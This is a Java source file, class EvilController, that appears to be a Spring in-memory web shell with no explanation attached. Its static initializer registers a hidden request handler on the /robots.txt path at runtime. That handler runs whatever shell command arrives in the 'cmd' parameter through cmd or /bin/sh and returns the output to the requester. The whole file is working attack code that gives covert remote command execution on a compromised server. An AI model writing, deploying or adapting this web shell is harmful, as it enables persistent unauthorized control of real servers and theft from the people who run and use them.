import org.apache.catalina.core.StandardContext;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class EvilController {
    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0);
            RequestMappingHandlerMapping bean = context.getBean(RequestMappingHandlerMapping.class);
            Method test = EvilController.class.getMethod("test");
            PatternsRequestCondition url = new PatternsRequestCondition("/robots.txt");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            EvilController evilController = new EvilController("a");
            System.out.println(1);
            bean.registerMapping(info,evilController,test);
        }catch (Exception e){
            e.printStackTrace();
            System.out.println(2);
        }
        System.out.println("success");
    }
    public  void test(){
        System.out.println(1);
        ServletRequestAttributes servletRequestAttributes = (ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes());
        HttpServletRequest req = servletRequestAttributes.getRequest();
        HttpServletResponse resp = servletRequestAttributes.getResponse();
        PrintWriter writer = null;
        try {
            writer = resp.getWriter();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String cmd = req.getParameter("cmd");
        String[] commands = new String[3];
        String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
            commands[0] = "cmd";
            commands[1] = "/c";
        } else {
            commands[0] = "/bin/sh";
            commands[1] = "-c";
        }
        commands[2] = cmd;
        try {
            String next = new Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter("\\A").next();
            writer.write(next);
            writer.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public  EvilController(String a){

    }

    public static void main(String[] args) {
        System.out.println(1);
    }
}
